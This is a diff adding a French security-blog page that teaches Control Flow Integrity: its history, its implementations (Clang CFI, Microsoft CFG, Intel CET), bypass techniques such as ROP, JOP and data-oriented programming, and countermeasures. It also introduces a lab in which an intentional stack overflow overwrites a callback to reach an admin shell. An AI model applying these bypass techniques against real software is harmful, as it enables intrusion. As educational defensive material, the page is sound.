+            <li data-i18n="s11_li1">Martin Abadi, Mihai Budiu, Ulfar Erlingsson, Jay Ligatti, <em>"Control-Flow Integrity: Principles, Implémentations, and Applications"</em>, CCS 2005</li>
+            <li data-i18n="s11_li2">Hovav Shacham, <em>"The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)"</em>, CCS 2007</li>
+            <li data-i18n="s11_li3">Hong Hu, Shweta Shinde, Sendroiu Adrian, Prateek Saxena, Zhenkai Liang, <em>"Data-Oriented Programming: On the Expressiveness of Non-Control Data Attacks"</em>, IEEE S&amp;P 2016</li>
+            <li data-i18n="s11_li4">Intel, <em>"A Technical Look at Intel's Control-flow Enforcement Technology"</em>, 2020</li>
+            <li data-i18n="s11_li5">Clang CFI documentation : <a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html" target="_blank" class="underline underline-offset-4 decoration-1 hover:text-black transition-colors">clang.llvm.org/docs/ControlFlowIntegrity.html</a></li>
+            <li data-i18n="s11_li6">Microsoft, <em>"Control Flow Guard"</em>, Windows Dev Documentation : <a href="https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard" target="_blank" class="underline underline-offset-4 decoration-1 hover:text-black transition-colors">learn.microsoft.com</a></li>
+            <li data-i18n="s11_li7">pwntools documentation <code>elf.sym</code>, <code>p64</code>, <code>process/remote</code> : <a href="https://docs.pwntools.com" target="_blank" class="underline underline-offset-4 decoration-1 hover:text-black transition-colors">docs.pwntools.com</a></li>
+        </ul>
+
+    </main>
+
+    <!-- NEWSLETTER -->
+    <section class="py-24 bg-black text-white border-t border-black">
+        <div class="max-w-4xl mx-auto px-6 text-center">
+            <h2 class="text-3xl font-black uppercase tracking-tighter mb-6" data-i18n="news_title">Recevoir nos recherches (0-Spam)</h2>
+            <p class="text-gray-400 font-light mb-10 text-sm" data-i18n="news_desc">
+                Inscrivez-vous à notre flux de transmission sécurisé. Uniquement des writeups techniques, des annonces de CTF et des rapports d'audit publics.
+            </p>
+            <form class="flex flex-col md:flex-row gap-4 justify-center" id="newsletter-form">
+                <input type="email" id="news-input" required placeholder="email@domain.com"
+                    class="bg-transparent border border-gray-600 px-6 py-3 text-sm focus:outline-none focus:border-white w-full md:w-96 font-mono text-center md:text-left">
+                <button type="submit" id="news-btn" data-i18n="news_btn"
+                    class="bg-white text-black px-8 py-3 text-[11px] font-black uppercase tracking-widest hover:bg-gray-200 transition-all">
+                    S'abonner_
+                </button>
+            </form>
+        </div>
+    </section>
+
+        
+
+
+    <!-- FOOTER -->
+    <footer class="bg-gray-100 py-16 border-t border-gray-300">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-1 md:grid-cols-4 gap-12">
+            <div class="space-y-6">
+                <div class="text-xl font-black tracking-tighter mb-4">BUG|PWN</div>
+                <p class="text-[11px] leading-relaxed text-gray-500 uppercase tracking-wider max-w-xs font-medium" data-i18n="footer_bio">
+                    Unité de recherche en vulnérabilités avancées et audit de systèmes critiques.
+                </p>
+                <div class="flex gap-4">
+                    <a href="https://x.com/bug_pwn" target="_blank" class="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center hover:bg-gray-700"><i class="fab fa-x-twitter"></i></a>
+                    <a href="https://github.com/0xbugpwn" target="_blank" class="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center hover:bg-gray-700"><i class="fab fa-github"></i></a>
+                    <a href="https://www.linkedin.com/company/0xbugpwn" target="_blank" class="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center hover:bg-gray-700"><i class="fab fa-linkedin"></i></a>
+                    <a href="https://www.youtube.com/@bug_pwn" target="_blank" class="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center hover:bg-gray-700"><i class="fab fa-youtube"></i></a>
+                </div>
+            </div>
+            <div>
+                <h5 class="text-[10px] font-black text-gray-400 uppercase tracking-[0.3em] mb-10">Capabilities_Index</h5>
+                <ul class="space-y-4 text-[11px] font-bold uppercase tracking-widest text-black">
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all">Reverse Engineering</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all">Exploit Development</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all" data-i18n="f_link_audit">Audit de Code Source</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all" data-i18n="f_link_ics">Systèmes Industriels</a></li>
+                </ul>
+            </div>
+            <div>
+                <h5 class="text-[10px] font-black text-gray-400 uppercase tracking-[0.3em] mb-10">Knowledge_Base</h5>
+                <ul class="space-y-4 text-[11px] font-bold uppercase tracking-widest text-black">
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all">Repository Writeups</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all">Whitepapers</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all" data-i18n="f_link_tools">Outils Open Source</a></li>
+                    <li><a href="https://bugpwn.com/battlectf/archive/" target="_blank" class="hover:underline underline-offset-8 decoration-1 transition-all">CTF Archives</a></li>
+                </ul>
+            </div>
+            <div class="space-y-6">
+                <h5 class="text-[10px] font-black text-gray-400 uppercase tracking-[0.3em] mb-10">Secure_Channel</h5>
+                <p class="text-[10px] text-gray-400 uppercase tracking-widest font-medium italic" data-i18n="footer_pgp">
+                    Pour toute communication sensible, privilégiez le chiffrement PGP.
+                </p>
+                <a href="../contact.html#pgp-section" class="inline-block border border-black px-3 py-1 text-xs font-mono font-bold hover:bg-black hover:text-white transition">
+                    <i class="fas fa-key mr-2"></i> 0x0E42807D
+                </a>
+                <p class="text-xs text-gray-400 mt-4">© 2026 BUG|PWN RESEARCH UNIT. <br>ALL RIGHTS RESERVED.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        function copyToClipboard(elementId, btn) {
+            const textToCopy = document.getElementById(elementId).innerText;
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                const originalText = btn.innerHTML;
+                const copiedText = currentLang === 'fr' ? '<i class="fas fa-check"></i> COPIÉ' : '<i class="fas fa-check"></i> COPIED';
+                btn.innerHTML = copiedText;
+                btn.classList.add('text-green-600');
+                btn.classList.remove('text-gray-500');
+                setTimeout(() => {
+                    btn.innerHTML = originalText;
+                    btn.classList.remove('text-green-600');
+                    btn.classList.add('text-gray-500');
+                }, 2000);
+            });
+        }
+
+        const newsForm  = document.getElementById('newsletter-form');
+        const newsBtn   = document.getElementById('news-btn');
+        const newsInput = document.getElementById('news-input');
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxpgfOi38v9enff6fwL5n1QPLC_iPz2sXfh0YDiHL5gb5_33qmN1EOyKNqR7FXwt58a/exec';
+
+        if (newsForm) {
+            newsForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                if (newsInput.value) {
+                    const originalText = newsBtn.innerHTML;
+                    newsBtn.innerHTML = "SENDING_ <i class='fas fa-circle-notch fa-spin ml-2'></i>";
+                    let requestBody = new FormData();
+                    requestBody.append('Email', newsInput.value);
+                    fetch(scriptURL, { method: 'POST', body: requestBody, mode: 'no-cors' })
+                        .then(() => {
+                            newsBtn.innerHTML = currentLang === 'fr' ? "TRANSMIS <i class='fas fa-check ml-2'></i>" : "TRANSMITTED <i class='fas fa-check ml-2'></i>";
+                            newsBtn.classList.remove('bg-white', 'text-black');
+                            newsBtn.classList.add('bg-gray-500', 'text-white');
+                            newsInput.value = '';
+                            setTimeout(() => {
+                                newsBtn.innerHTML = originalText;
+                                newsBtn.classList.add('bg-white', 'text-black');
+                                newsBtn.classList.remove('bg-gray-500', 'text-white');
+                            }, 3000);
+                        })
+                        .catch(() => {
+                            newsBtn.innerHTML = "DONE_";
+                            setTimeout(() => newsBtn.innerHTML = originalText, 3000);
+                        });
+                }
+            });
+        }
+        
+        const translations = {
+            fr: {
+                nav_services: "Services", nav_research: "Recherche", nav_blog: "Blog", nav_events: "Events", nav_contact: "Nous contacter",
+                art_back: "<i class=\"fas fa-arrow-left group-hover:-translate-x-2 transition-transform\"></i> Retour_Archives",
+                art_title: "Control Flow<br>\n                <span class=\"text-gray-300\">Integrity :</span><br>\n                Théorie, Mécanismes<br>et Exploitation.",
+                art_subtitle: "Comprendre le CFI de ses origines à ses limites. Une plongée complète dans la théorie, les mécanismes de défense, les implémentations réelles et les techniques d'exploitation avancées incluant le Data-Oriented Programming.",
+                art_level: "Niveau : intermédiaire / avancé",
+                art_read_time: "Lecture ≈ 30 min",
+                art_lab: "1 laboratoire pratique",
+                art_author_role: "Lead Vulnerability Researcher",
+                toc_title: "Table des matières",
+                toc_1: "<strong>01.</strong> Qu'est-ce que le Control Flow Integrity ?",
+                toc_2: "<strong>02.</strong> Contexte historique : la course aux armements",
+                toc_3: "<strong>03.</strong> Les flots de contrôle en C et C++",
+                toc_4: "<strong>04.</strong> Le graphe de flot de contrôle (CFG)",
+                toc_5: "<strong>05.</strong> CFI grossier vs CFI fin : la granularité",
+                toc_6: "<strong>06.</strong> Implémentations réelles du CFI",
+                toc_7: "<strong>07.</strong> Limites du CFI et vecteurs d'attaque",
+                toc_8: "<strong>08.</strong> Data-Oriented Programming (DOP)",
+                toc_9: "<strong>09.</strong> Contre-mesures et CFI robuste",
+                toc_10: "<strong>10.</strong> Laboratoire : vuln, un CFI fin réel à contourner",
+                s1_h2: "01 - Qu'est-ce que le Control Flow Integrity ?",
+                s1_p1: "Le <strong>Control Flow Integrity</strong>, ou CFI, est une propriété de sécurité formelle qui stipule qu'un programme en cours d'exécution ne peut emprunter que les chemins de code qui ont été <em>explicitement prévus</em> par son auteur. Autrement dit, chaque branchement indirect, qu'il s'agisse d'un retour de fonction, d'un appel via un pointeur, ou d'un saut calculé, doit toujours aboutir à une destination appartenant à un ensemble de cibles légitimes déterminé à l'avance.",
+                s1_p2: "La notion a été formalisée en 2005 par Martin Abadi, Mihai Budiu, Ulfar Erlingsson et Jay Ligatti dans un papier fondateur intitulé <em>\"Control-Flow Integrity: Principles, Implémentations, and Applications\"</em>. Leur constat de départ est simple mais crucial : les mécanismes de protection mémoire de l'époque (ASLR, DEP/NX) réduisaient la surface d'attaque mais ne l'éliminaient pas, car un attaquant disposant d'une primitive de lecture mémoire pouvait toujours rediriger l'exécution vers du code existant.",
+                s1_b_t: "Définition formelle",
+                s1_b_p: "Le CFI impose que, pour tout transfert de contrôle indirect <em>t</em> dans un programme P, la destination effective soit toujours un élément de l'ensemble <em>Targets(t)</em> prédicalement défini par l'analyse statique du programme. Si ce n'est pas le cas, le comportement est indéfini et une politique de sécurité (terminaison, log, alerte) est appliquée.",
+                s1_p3: "En pratique, le CFI agit comme un <strong>garde-fou de dernière ligne</strong>. Il ne supprime pas les vulnérabilités mémoire : les buffer overflows et use-after-free restent des bugs. En revanche, il rend leur exploitation beaucoup plus difficile en empêchant un attaquant de rediriger le flot d'exécution vers une cible arbitraire une fois qu'il a corrompu de la mémoire.",
+                s2_h2: "02 - Contexte historique : la course aux armements",
+                s2_p1: "Pour bien comprendre pourquoi le CFI est apparu, il faut retracer l'évolution des techniques d'exploitation et des contre-mesures qui les ont précédées. Chaque protection a engendré de nouvelles techniques d'attaque, dans une dynamique de course aux armements permanente.",
+                s2_h3_1: "Les années 1990 : l'exploitation naive",
+                s2_p2: "Les premières attaques par buffer overflow (popularisées par l'article d'Aleph One, <em>\"Smashing the Stack for Fun and Profit\"</em>, 1996) reposaient sur une technique directe : écraser l'adresse de retour sur la pile pour pointer vers du <em>shellcode</em> injecté dans le buffer lui-même. Le processeur exécutait alors ce code arbitraire avec tous les privilèges du processus vulnérable.",
+                s2_h3_2: "NX/DEP : l'interdiction d'execution",
+                s2_p3: "La réponse des systèmes d'exploitation et des processeurs a été d'introduire le bit <strong>NX</strong> (<em>No-eXecute</em>) au niveau matériel, et son équivalent logiciel <strong>DEP</strong> (<em>Data Execution Prevention</em>) sous Windows. Le principe : une page mémoire ne peut pas être à la fois writable et exécutable. Le shellcode injecté dans un buffer de données ne peut plus être exécuté.",
+                s2_h3_3: "Le Return-Oriented Programming : contourner NX",
+                s2_p4: "En 2007, Hovav Shacham publie le travail fondateur sur le <strong>Return-Oriented Programming (ROP)</strong>. L'idée : puisque NX empêche d'exécuter du code injecté, on va réutiliser des fragments de code <em>déjà présents</em> dans le binaire ou les bibliothèques. Ces fragments, appelés <strong>gadgets</strong>, sont de courtes séquences d'instructions qui se terminent toutes par une instruction <code>ret</code>. En construisant une chaîne d'adresses de gadgets sur la pile, l'attaquant peut exécuter des opérations arbitraires, tout en restant dans des zones mémoire marquées exécutables.",
+                s2_b_t: "Pourquoi ROP est si puissant",
+                s2_b_p: "Un binaire typique, avec ses bibliothèques linkées (<code>libc</code>, etc.), contient des milliers de gadgets. Des outils comme <code>ROPgadget</code>, <code>ropper</code> ou <code>pwntools</code> permettent de les trouver automatiquement. Il est souvent possible de construire une chaîne Turing-complète à partir des seuls gadgets disponibles dans un binaire.",
+                s2_h3_4: "ASLR : brouiller les adresses",
+                s2_p5: "L'<strong>Address Space Layout Randomization</strong> (ASLR), activée dans le noyau Linux depuis 2005 et Windows Vista depuis 2007, randomise les adresses de base des segments (pile, tas, bibliothèques). Sans connaître les adresses exactes des gadgets, construire une chaîne ROP devient difficile, mais pas impossible si une fuite mémoire (<em>information leak</em>) est disponible.",
+                s2_h3_5: "Le CFI comme réponse systemique",
+                s2_p6: "C'est dans ce contexte que le CFI prend tout son sens. L'idée est de sortir de la logique réactive (boucher un trou, trouver un contournement, reboucher) pour adopter une propriété de sécurité <em>structurelle</em> : même si un attaquant connaît toutes les adresses du programme et peut corrompre de la mémoire, il ne peut pas rediriger les sauts indirects vers des cibles qu'il choisit librement.",
+                s3_h2: "03 - Les flots de contrôle en C et C++",
+                s3_p1: "Avant de comprendre comment le CFI les protège, il faut distinguer les différents types de transferts de contrôle qu'un programme peut effectuer, et identifier lesquels sont dangereux.",
+                s3_h3_1: "Transferts directs vs transferts indirects",
+                s3_p2: "Un transfert est dit <strong>direct</strong> lorsque sa destination est encodée en dur dans l'instruction elle-même au moment de la compilation. L'instruction <code>call foo</code> en assembleur x86 encode directement le déplacement vers la fonction <code>foo</code>. Peu importe ce que fait l'attaquant aux données, cette instruction ira toujours vers <code>foo</code>.",
+                s3_p3: "Un transfert est dit <strong>indirect</strong> lorsque sa destination est calculée à l'exécution, à partir d'une valeur en registre ou en mémoire. C'est le cas des pointeurs de fonctions en C, des vtables en C++, et de l'instruction <code>ret</code> (qui saute vers l'adresse dépilée de la stack). Ces destinations peuvent être corrompues par un attaquant qui dispose d'une écriture mémoire arbitraire.",
+                s3_th1: "Mécanisme", s3_th2: "Exemple C/C++", s3_th3: "Instruction ASM", s3_th4: "Risque",
+                s3_td1_1: "Appel direct", s3_td1_4: "Faible", s3_td2_1: "Retour de fonction", s3_td2_4: "Élevé",
+                s3_td3_1: "Pointeur de fonction", s3_td3_4: "Élevé", s3_td4_1: "Vtable C++", s3_td4_4: "Élevé",
+                s3_td5_1: "Saut indirect", s3_td5_4: "Moyen",
+                s3_p4: "Le cas du <code>ret</code> mérite une attention particulière : l'adresse de retour est stockée sur la pile par l'instruction <code>call</code>, dans une zone mémoire souvent adjacente aux buffers locaux. Un stack overflow classique peut la corrompre directement : c'est la vulnérabilité originelle de 1996, toujours pertinente aujourd'hui.",
+                s3_p5: "Les <strong>vtables C++</strong> sont un autre vecteur majeur : quand un objet est créé, un pointeur vers sa vtable (table de pointeurs vers les méthodes virtuelles) est stocké dans l'objet lui-même. Si un attaquant peut écrire dans la mémoire de l'objet via un heap overflow ou un use-after-free, il peut remplacer ce pointeur par l'adresse d'une fausse vtable pointant vers du code arbitraire.",
+                s4_h2: "04 - Le graphe de flot de contrôle (CFG)",
+                s4_p1: "Le concept central du CFI est le <strong>Control Flow Graph</strong>, ou CFG. Il s'agit d'une représentation abstraite de tous les chemins d'exécution possibles d'un programme, construite par analyse statique au moment de la compilation.",
+                s4_p2: "Dans un CFG, chaque nœud représente un bloc de base (une séquence d'instructions sans branchement interne), et chaque arête représente un transfert de contrôle possible. Pour chaque point de branchement indirect dans le programme, chaque <code>call rax</code>, chaque <code>ret</code>, chaque déréférencement de vtable, le CFG définit un ensemble de cibles légitimes.",
+                s4_h3_1: "Exemple conceptuel",
+                s4_p3: "Imaginons un programme qui dispose de deux callbacks possibles, <code>handler_a</code> et <code>handler_b</code>, appelés via un pointeur de fonction. Le CFG dira que ce site d'appel a exactement deux cibles valides : <code>handler_a</code> et <code>handler_b</code>. Si à l'exécution, le pointeur de fonction pointe vers <code>system</code> ou vers un gadget ROP, la vérification CFI échoue et le programme est arrêté.",
+                s4_b_t: "Precision du CFG",
+                s4_b_p: "La qualité d'un CFI dépend directement de la précision de son CFG. Un CFG trop permissif (qui met toutes les fonctions dans le même ensemble de cibles) offre peu de protection. Un CFG très précis (qui distingue les cibles site par site, selon les types de signatures) est beaucoup plus résistant mais plus complexe à construire.",
+                s4_h3_2: "Visualisation du CFG",
+                s4_p4: "Le CFG peut être construit à plusieurs niveaux. La méthode la plus précise est l'analyse au niveau du compilateur (Clang/LLVM), qui dispose de toute l'information de types et peut distinguer les sites d'appel selon la signature exacte de la fonction attendue. Des analyses binaires post-compilation (comme celles effectuées par des outils de reverse engineering) sont possibles mais moins précises, car une partie de l'information de types est perdue à la compilation.",
+                s5_h2: "05 - CFI grossier vs CFI fin : la granularité",
+                s5_p1: "La granularité est le paramètre le plus important d'une implémentation CFI. Elle détermine à quel point l'ensemble des cibles valides pour chaque saut indirect est restreint.",
+                s5_h3_1: "CFI grossier (coarse-grained)",
+                s5_p2: "Un CFI grossier regroupe tous les sites d'appel indirects dans un ou quelques grands ensembles. Par exemple, il pourrait vérifier uniquement que la destination d'un <code>call indirect</code> est le début d'une fonction quelconque dans le binaire. C'est une contrainte très faible : dans un binaire typique, des centaines de fonctions sont des cibles valides, ce qui laisse beaucoup de latitude à un attaquant pour construire une chaîne d'exploitation.",
+                s5_p3: "Microsoft Control Flow Guard (CFG), introduit dans Windows 8.1 Update 3, est souvent cité comme un exemple de CFI à granularité intermédiaire. Il maintient une bitmap des adresses de début de fonctions valides et vérifie chaque appel indirect contre cette bitmap. Efficace contre les attaques naïves, mais plusieurs techniques de contournement ont été publiées, notamment en ciblant des fonctions \"trop permissives\" présentes dans l'ensemble des cibles valides.",
+                s5_h3_2: "CFI fin (fine-grained)",
+                s5_p4: "Un CFI fin restreint l'ensemble des cibles valides site par site. Pour un appel indirect à un endroit précis du code, seules les fonctions dont la <em>signature de type est compatible</em> sont des cibles valides. Clang CFI (disponible via le flag <code>-fsanitize=cfi</code>) implémente plusieurs variantes de CFI fin :",
+                s5_p5: "<code>-fsanitize=cfi-icall</code> protège les appels de fonctions indirects en vérifiant que la fonction appelée a exactement le bon type. <code>-fsanitize=cfi-vcall</code> protège les appels virtuels C++ en vérifiant que le receveur a le bon type dynamique. Ces vérifications sont bien plus restrictives et réduisent drastiquement l'espace des cibles disponibles pour un attaquant.",
+                s5_th1: "Approche", s5_th2: "Granularité", s5_th3: "Overhead perf.", s5_th4: "Résistance",
+                s5_td1_1: "Microsoft CFG", s5_td1_2: "Entrées de fonctions", s5_td1_4: "Modérée",
+                s5_td2_1: "Clang CFI icall", s5_td2_2: "Compatibilité de type", s5_td2_4: "Bonne",
+                s5_td3_1: "Clang CFI vcall", s5_td3_2: "Hiérarchie de classes", s5_td3_4: "Bonne",
+                s5_td4_1: "Intel CET (shadow stack)", s5_td4_2: "Retours seulement", s5_td4_3: "Hardware", s5_td4_4: "Très bonne",
+                s5_td5_1: "CFI maison (table sur pile)", s5_td5_2: "Table statique simple", s5_td5_3: "Minimal", s5_td5_4: "Faible",
+                s6_h2: "06 - Implémentations réelles du CFI",
+                s6_h3_1: "Clang CFI (LLVM)",
+                s6_p1: "L'implémentation la plus rigoureuse sur Linux/macOS. Elle opère entièrement au niveau du compilateur et insère des vérifications inline avant chaque transfert indirect. Les métadonnées (tables de types, informations de hiérarchie de classes) sont stockées dans sections en lecture seule du binaire, protégées par les permissions de pages. Clang CFI supporte plusieurs modes : <code>cfi-icall</code>, <code>cfi-vcall</code>, <code>cfi-nvcall</code>, <code>cfi-derived-cast</code>, <code>cfi-unrelated-cast</code>.",
+                s6_h3_2: "Microsoft Control Flow Guard (CFG)",
+                s6_p2: "Intégré dans le compilateur MSVC et le système Windows depuis Windows 8.1 Update 3. Le mécanisme repose sur une bitmap en mémoire indiquant quelles adresses sont des débuts de fonctions valides. Avant chaque appel indirect, le compilateur insère un appel à une routine de validation du noyau. CFG est activé par défaut pour les binaires système Windows modernes.",
+                s6_h3_3: "Intel CET : Control-flow Enforcement Technology",
+                s6_p3: "CET est une extension matérielle introduite dans les processeurs Intel Tiger Lake (2020) et AMD Zen 3 (2020). Elle se compose de deux mécanismes complémentaires. La <strong>Shadow Stack</strong> (SS) maintient une pile d'adresses de retour séparée dans une région mémoire spéciale, accessible uniquement par des instructions privilégiées. À chaque <code>ret</code>, le processeur compare l'adresse dépilée de la pile normale avec celle de la shadow stack : toute discordance déclenche une exception. La deuxième fonctionnalité, <strong>Indirect Branch Tracking</strong> (IBT), exige que chaque destination d'un saut indirect commence par une instruction spéciale <code>endbr64</code>. Toute tentative de sauter vers un gadget interne à une fonction (sans <code>endbr64</code>) est bloquée au niveau matériel.",
+                s6_b_t: "Avantage de CET",
+                s6_b_p: "Étant implémentée en hardware, la Shadow Stack est beaucoup plus difficile à contourner qu'un CFI logiciel. Elle ne dépend pas de la précision du CFG et protège tous les retours de fonctions, même ceux de bibliothèques non recompilées avec CFI.",
+                s7_h2: "07 - Limites du CFI et vecteurs d'attaque",
+                s7_p1: "Malgré sa puissance, le CFI n'est pas une panacée. Des chercheurs ont identifié plusieurs classes d'attaques qui permettent de le contourner, même dans ses variantes les plus rigoureuses.",
+                s7_h3_1: "Attaques sur le CFG lui-meme",
+                s7_p2: "Si les métadonnées du CFG (tables de types, bitmaps de fonctions valides) sont stockées dans une région mémoire accessible en écriture, un attaquant disposant d'une primitive d'écriture arbitraire peut les corrompre. C'est précisément la vulnérabilité que nous exploiterons dans le laboratoire : une table CFI stockée sur la pile est corruptible par le même overflow qui corrompt le callback.",
+                s7_h3_2: "Call-oriented Programming (COP)",
+                s7_p3: "Analogue au ROP, le COP exploite le fait qu'un CFI grossier autorise des centaines de fonctions comme cibles valides. Un attaquant peut enchaîner des appels vers des fonctions légitimes mais \"dangereuses\", des fonctions dont la combinaison produit un effet malveillant. Si <code>system()</code> est dans l'ensemble des cibles valides (ce qui est souvent le cas dans un programme qui l'utilise légitimement), un attaquant peut y sauter directement.",
+                s7_h3_3: "Jump-oriented Programming (JOP)",
+                s7_p4: "Le JOP est une variante du ROP qui utilise des gadgets se terminant par <code>jmp reg</code> plutôt que <code>ret</code>. Un CFI fin protégeant les retours mais pas tous les sauts indirects peut être contourné par cette technique.",
+                s7_h3_4: "TOCTTOU sur les verifications CFI",
+                s7_p5: "Time-of-Check-Time-of-Use : si la vérification CFI et l'utilisation effective du pointeur ne sont pas atomiques, un thread concurrent peut modifier le pointeur entre les deux. Cette fenêtre de race condition est généralement très étroite mais a été démontrée dans des contextes spécifiques.",
+                s7_b_t: "La lecon fondamentale",
+                s7_b_p: "Un CFI est aussi fort que ses hypothèses. Si l'attaquant peut corrompre les métadonnées du CFI lui-même, ou si l'ensemble des cibles valides est trop large, la protection est contournée. Un CFI robuste doit stocker ses données de référence dans une mémoire immuable et utiliser un CFG aussi précis que possible.",
+                s8_h2: "08 - Data-Oriented Programming (DOP)",
+                s8_p1: "Le <strong>Data-Oriented Programming</strong> est une technique d'exploitation avancée formalisée par Hong Hu, Shweta Shinde, Sendroiu Adrian, Prateek Saxena et Zhenkai Liang en 2016. Là où le ROP et le JOP détournent le <em>flot de contrôle</em>, le DOP manipule uniquement des <strong>données</strong> pour produire un effet malveillant, tout en maintenant un flot de contrôle apparemment légitime.",
+                s8_h3_1: "Le principe",
+                s8_p2: "Dans un programme vulnérable, certaines variables de données influencent le comportement du programme de façon significative : elles sont lues lors de comparaisons, utilisées comme indices, passées comme arguments à des fonctions sensibles. Un attaquant DOP identifie ces variables (<em>data gadgets</em>) et exploite une primitive d'écriture pour les corrompre, orientant ainsi le programme vers un comportement non prévu sans jamais modifier une adresse de retour ni violer un invariant CFI.",
+                s8_h3_2: "Pourquoi c'est puissant face au CFI",
+                s8_p3: "Un CFI ne surveille que les transferts de contrôle. Il ne dit rien sur les données. Si un attaquant peut amener le programme à appeler <code>system(\"/bin/sh\")</code> via un chemin de code parfaitement légitime, en corrompant l'argument passé à une fonction autorisée, ou en corrompant une variable de condition, le CFI ne voit rien d'anormal.",
+                s8_p4: "Dans notre laboratoire, nous allons utiliser une forme de DOP : plutôt que de modifier une adresse de retour, nous allons corrompre la <strong>table de vérification CFI elle-même</strong>, qui est une donnée sur la pile. Le flot de contrôle passe par le chemin \"légitime\" d'appel du callback, mais les données qui définissent ce qui est \"légitime\" ont été altérées.",
+                s9_h2: "09 - Contre-mesures et CFI robuste",
+                s9_p1: "Face aux vecteurs d'attaque identifiés, plusieurs bonnes pratiques permettent de renforcer considérablement un mécanisme CFI.",
+                s9_h3_1: "Immuabilité des métadonnées",
+                s9_p2: "La règle la plus importante : les tables de fonctions valides, les bitmaps CFG, et toute métadonnée utilisée pour les vérifications CFI doivent être stockées dans des sections en lecture seule (<code>.rodata</code>) ou dans des pages mémoire marquées non-writable après initialisation (<code>mprotect(PROT_READ)</code>). Un attaquant qui ne peut pas écrire dans ces régions ne peut pas corrompre le CFG.",
+                s9_h3_2: "Cloisonnement mémoire",
+                s9_p3: "Les données de vérification ne doivent jamais être adjacentes aux buffers manipulés par l'utilisateur. Idéalement, elles sont dans un segment mémoire séparé, protégé par des guard pages.",
+                s9_h3_3: "CFG le plus fin possible",
+                s9_p4: "Minimiser l'ensemble des cibles valides pour chaque site d'appel. Si un pointeur de fonction est toujours utilisé pour appeler des fonctions de type <code>void (*)(int)</code>, seules les fonctions avec cette signature exacte devraient être dans l'ensemble des cibles.",
+                s9_h3_4: "Defense en profondeur",
+                s9_p5: "Le CFI ne doit pas être la seule ligne de défense. Combiné avec SafeStack (qui sépare la pile de retour des buffers de données), avec des stack canaries, avec l'ASLR et avec des sanitizers mémoire en développement (<code>AddressSanitizer</code>, <code>MemorySanitizer</code>), il forme une défense en profondeur bien plus robuste.",
+                s9_st1_t: "Métadonnées en mémoire immuable", s9_st1_d: "Stocker les tables CFI dans des sections <code>.rodata</code> ou des pages protégées avec <code>mprotect(PROT_READ)</code> après initialisation.",
+                s9_st2_t: "Utiliser un compilateur CFI éprouvé", s9_st2_d: "Préférer Clang CFI (<code>-fsanitize=cfi</code>) ou Intel CET plutôt qu'une implémentation maison. Les implémentations maison ont presque invariablement des failles.",
+                s9_st3_t: "SafeStack + stack canaries", s9_st3_d: "SafeStack (<code>-fsanitize=safe-stack</code>) sépare la pile de retour des buffers locaux, neutralisant les overflows classiques. Les canaries détectent les corruptions avant le retour.",
+                s9_st4_t: "Bounded reads : ne jamais lire plus que la taille du buffer", s9_st4_d: "La cause profonde reste toujours la même : lire des données non bornées dans un buffer fixe. <code>read(fd, buf, sizeof(buf))</code> élimine la vulnérabilité à la source.",
+                s10_h2: "10 - Laboratoire : vuln, un CFI fin réel à contourner",
+                s10_lab_title: "⚗ Laboratoire pratique",
+                s10_lab_sub: "Ce chapitre applique tous les concepts vus précédemment sur un binaire compilé avec <strong>Clang CFI fin réel</strong> (<code>-fsanitize=cfi -fvisibility=hidden -flto</code>). Le challenge révèle une limite fondamentale que même un CFI fin ne peut pas couvrir seul.",
+                s10_h3_1: "Code source complet",
+                s10_h3_2: "Contexte : la commande de compilation",
+                s10_p1: "Le programme <code>vuln.c</code> est compilé directement avec les flags Clang CFI de production :",
+                s10_p2: "<code>-fno-pie -no-pie</code> désactive le Position Independent Executable : les adresses des fonctions sont fixes et lisibles directement depuis la table de symboles ELF, sans besoin de fuite mémoire. <code>-flto</code> active la Link-Time Optimization, prérequis technique de Clang CFI : le compilateur a besoin d'une vision globale du programme pour construire son CFG et insérer les vérifications de type. <code>-fsanitize=cfi</code> avec <code>-fvisibility=hidden</code> est l'implémentation CFI <em>fine</em> de Clang LLVM. Le compilateur construit un CFG précis et insère des vérifications de compatibilité de type <strong>par site d'appel</strong> avant chaque transfert indirect.",
+                s10_h3_3: "La question centrale",
+                s10_p3: "Si Clang CFI fin est actif et insère de vraies vérifications par site d'appel, comment est-il possible de rediriger l'exécution vers <code>admin_shell()</code> ? La réponse ne tient pas dans un contournement du CFI du compilateur. Elle tient dans ce que le CFI vérifie exactement, et ce qu'il est <strong>structurellement incapable</strong> de vérifier.",
+                s10_b_t: "La limite sémantique du CFI fin",
+                s10_b_p: "Clang CFI fin vérifie les <strong>types</strong>, pas les <strong>intentions</strong>. Il ne sait pas quelles fonctions sont censées être appelées par ce chemin précis : il sait uniquement lesquelles ont la bonne signature. <code>regular_user</code> et <code>admin_shell</code> ont toutes deux la signature <code>void (*)().</code> Pour le compilateur, les deux sont des cibles équivalentes et légitimes.",
+                s10_h3_4: "La vulnérabilité : le stack buffer overflow",
+                s10_p4: "La faille est explicite dans le source. <code>read</code> accepte 128 octets pour un buffer de seulement 32 octets :",
+                s10_p5: "L'overflow écrit 128 octets à partir de l'adresse de <code>data.buffer</code>. Les 32 premiers octets remplissent le buffer, les octets 32-39 écrasent <code>data.action</code> avec l'adresse que l'attaquant choisit. C'est du <strong>Data-Oriented Programming pur</strong> : aucune modification de flot de contrôle classique, uniquement une corruption de données.",
